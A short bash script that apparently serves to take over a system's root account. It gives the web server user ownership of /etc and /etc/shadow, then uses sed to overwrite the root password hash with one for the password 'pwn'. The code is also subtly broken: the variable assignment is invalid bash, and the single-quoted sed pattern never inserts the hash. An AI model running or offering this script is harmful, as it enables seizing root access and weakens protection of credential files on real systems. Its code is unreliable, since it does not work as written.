#!/bin/bash

# Script for change a password modifying the shadow file. Obviously, we need root privileges to do this.
# default pass in the script: "pwn"

$user="www-data"
$pass=`openssl passwd -1 -salt xyz pwn`
chown $user.$user /etc; chown $user.$user /etc/shadow
sed -i -e 's/^root:[^:]\+:/root:$pass:/' /etc/shadow
 
